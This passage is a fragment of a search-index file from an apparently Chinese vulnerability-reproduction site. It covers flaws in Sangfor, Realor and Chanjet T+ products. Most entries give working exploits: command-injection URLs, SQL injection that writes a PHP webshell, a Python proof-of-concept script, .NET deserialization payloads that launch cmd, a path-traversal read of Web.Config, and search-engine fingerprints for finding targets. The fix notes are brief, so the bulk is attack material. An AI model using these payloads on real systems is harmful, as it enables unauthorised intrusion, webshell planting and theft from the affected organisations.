","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"isHighPerformance : !!SFIsHighPerformance,\" ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 访问漏洞Url /tool/log/c.php?strip_slashes=system\u0026host=ipconfig ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"深信服 行为感知系统 c.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E8%A1%8C%E4%B8%BA%E6%84%9F%E7%9F%A5%E7%B3%BB%E7%BB%9F-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E8%A1%8C%E4%B8%BA%E6%84%9F%E7%9F%A5%E7%B3%BB%E7%BB%9F-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 深信服 行为感知系统 c.php 远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E8%A1%8C%E4%B8%BA%E6%84%9F%E7%9F%A5%E7%B3%BB%E7%BB%9F-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E8%A1%8C%E4%B8%BA%E6%84%9F%E7%9F%A5%E7%B3%BB%E7%BB%9F-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 深信服 行为感知系统 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E8%A1%8C%E4%B8%BA%E6%84%9F%E7%9F%A5%E7%B3%BB%E7%BB%9F-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E8%A1%8C%E4%B8%BA%E6%84%9F%E7%9F%A5%E7%B3%BB%E7%BB%9F-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"isHighPerformance : !!SFIsHighPerformance,\" ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E8%A1%8C%E4%B8%BA%E6%84%9F%E7%9F%A5%E7%B3%BB%E7%BB%9F-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E8%A1%8C%E4%B8%BA%E6%84%9F%E7%9F%A5%E7%B3%BB%E7%BB%9F-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 访问漏洞Url /tool/log/c.php?strip_slashes=system\u0026host=ipconfig ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E8%A1%8C%E4%B8%BA%E6%84%9F%E7%9F%A5%E7%B3%BB%E7%BB%9F-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E8%A1%8C%E4%B8%BA%E6%84%9F%E7%9F%A5%E7%B3%BB%E7%BB%9F-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"瑞友 应用虚拟化系统 GetBSAppUrl SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E7%91%9E%E5%8F%8B-%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-getbsappurl-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%91%9E%E5%8F%8B-%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-getbsappurl-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 瑞友 应用虚拟化系统 GetBSAppUrl方法存在SQL注入漏洞，由于参数传入没有进行过滤导致存在SQL注入，攻击者通过漏洞可以获取数据库敏感信息 ","date":"0001-01-01","objectID":"/%E7%91%9E%E5%8F%8B-%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-getbsappurl-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%91%9E%E5%8F%8B-%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-getbsappurl-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 瑞友应用虚拟化系统 7.0.2.1 ","date":"0001-01-01","objectID":"/%E7%91%9E%E5%8F%8B-%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-getbsappurl-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%91%9E%E5%8F%8B-%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-getbsappurl-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"CASMain.XGI?cmd=GetDirApp\" \u0026\u0026 title==\"瑞友应用虚拟化系统\" ","date":"0001-01-01","objectID":"/%E7%91%9E%E5%8F%8B-%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-getbsappurl-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%91%9E%E5%8F%8B-%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-getbsappurl-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 在 GetBSAppUrl 方法中存在SQL注入漏洞，通过漏洞可以写入Webshell文件 验证POC /index.php?s=/Agent/GetBSAppUrl/AppID/')%3bselect+0x3c3f70687020706870696e666f28293b3f3e+into+outfile+%27C%3a\\\\Program+Files+(x86)\\\\RealFriend\\\\Rap+Server\\\\WebRoot\\\\test7.php%27%23/123 /test7.php ","date":"0001-01-01","objectID":"/%E7%91%9E%E5%8F%8B-%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-getbsappurl-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%91%9E%E5%8F%8B-%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-getbsappurl-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"瑞友天翼应用虚拟化系统 AgentBoard.XGI 远程代码执行漏洞 ","date":"0001-01-01","objectID":"/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-agentboard.xgi-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-agentboard.xgi-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 瑞友天翼应用虚拟化系统是基于服务器计算架构的应用虚拟化平台，它将用户各种应用软件集中部署到瑞友天翼服务集群，客户端通过 WEB 即可访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等。未经身份认证的远程攻击者可以利用系统中存在的 SQL 注入漏洞，写入后门文件，从而执行远程代码。 ","date":"0001-01-01","objectID":"/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-agentboard.xgi-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-agentboard.xgi-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 5.x \u003c= 瑞友天翼应用虚拟化系统 \u003c= 7.0.3.1 ","date":"0001-01-01","objectID":"/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-agentboard.xgi-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-agentboard.xgi-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 poc import requests import sys url = sys.argv[1] payload=\"/AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5C1.php%22+--+-\u0026cmd=UserLogin\" repose = requests.get(url=url+payload) if repose.status_code ==200: a = url + '1.php' b = requests.get(url=a) if b.status_code == 200: print('[+] 漏洞存在，验证地址: {}1.php '.format(url)) payload GET /AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5C2.php%22+--+-\u0026cmd=UserLogin HTTP/1.1 Host: xx.xx.xx.xx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: CookieLanguageName=ZH-CN; CookieAuthType=0 Upgrade-Insecure-Requests: 1 ","date":"0001-01-01","objectID":"/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-agentboard.xgi-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-agentboard.xgi-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞修复 避免将该系统开放至公网。 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，建议您在升级前做好数据备份工作，避免出现意外，酌情升级至安全版本：http://soft.realor.cn:88/Gwt7.0.4.1.exe ","date":"0001-01-01","objectID":"/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-agentboard.xgi-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-agentboard.xgi-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 畅捷通 T+ 前台远程命令执行漏洞 QVD-2023-13615 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A-t-%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-13615/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A-t-%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-13615/"},{"categories":null,"content":"漏洞描述 由于用友畅捷通 T+前台存在反序列化漏洞，恶意攻击者成功利用此漏洞可在目标服务器上执行任意命令。 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A-t-%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-13615/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A-t-%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-13615/"},{"categories":null,"content":"漏洞影响 T+13.0 T+16.0 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A-t-%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-13615/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A-t-%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-13615/"},{"categories":null,"content":"漏洞复现 poc POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1 Host: your-ip X-Ajaxpro-Method: GetStoreWarehouseByStore { \"storeID\":{} } 使用ysoserial.net工具构造payload ./ysoserial.exe -f JavaScriptSerializer -g ObjectDataProvider -c \"执行的命令\" exp POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1 Host: your-ip X-Ajaxpro-Method: GetStoreWarehouseByStore { \"storeID\":{ \"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\", \"MethodName\":\"Start\", \"ObjectInstance\":{ \"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\", \"StartInfo\": { \"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\", \"FileName\":\"cmd\", \"Arguments\":\"/c 执行的命令\" } } } } ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A-t-%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-13615/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A-t-%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-13615/"},{"categories":null,"content":"漏洞修复 目前官方已修复该漏洞，受影响用户可以升级更新到安全版本。官方下载链接：https://www.chanjetvip.com/product/goods/ ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A-t-%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-13615/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A-t-%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-13615/"},{"categories":null,"content":"用友 畅捷通T+ DownloadProxy.aspx 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-downloadproxy.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-downloadproxy.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 畅捷通T+ DownloadProxy.aspx文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-downloadproxy.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-downloadproxy.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 畅捷通T+ ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-downloadproxy.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-downloadproxy.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"畅捷通-TPlus\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-downloadproxy.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-downloadproxy.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /tplus/SM/DTS/DownloadProxy.aspx?preload=1\u0026Path=../../Web.Config ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-downloadproxy.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-downloadproxy.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 畅捷通T+ GetStoreWarehouseByStore 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-getstorewarehousebystore-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-getstorewarehousebystore-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 畅捷通T+ GetStoreWarehouseByStore 存在 .net反序列化漏洞，导致远程命令执行，控制服务器 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-getstorewarehousebystore-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-getstorewarehousebystore-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 畅捷通T+ ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-getstorewarehousebystore-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-getstorewarehousebystore-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"畅捷通-TPlus\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-getstorewarehousebystore-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-getstorewarehousebystore-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1 Host: User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F Connection: close Content-Length: 668 X-Ajaxpro-Method: GetStoreWarehouseByStore Accept-Encoding: gzip { \"storeID\":{ \"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\", \"MethodName\":\"Start\", \"ObjectInstance\":{ \"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\", \"StartInfo\":{ \"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\", \"FileName\":\"cmd\", \"Arguments\":\"/c whoami \u003e C:/Progra~2/Chanjet/TPlusStd/WebSite/2RUsL6jgx9sGX4GItQBcVfxarBM.txt\" } } } } /tplus/xxx.txt ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-getstorewarehousebystore-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-getstorewarehousebystore-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 畅捷通T+ RecoverPassword.aspx 管理员密码修改漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-recoverpassword.aspx-%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-recoverpassword.aspx-%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 畅捷通T+ RecoverPassword.aspx 存在未授权管理员密码修改漏洞，攻击者可以通过漏洞修改管理员账号密码登录后台 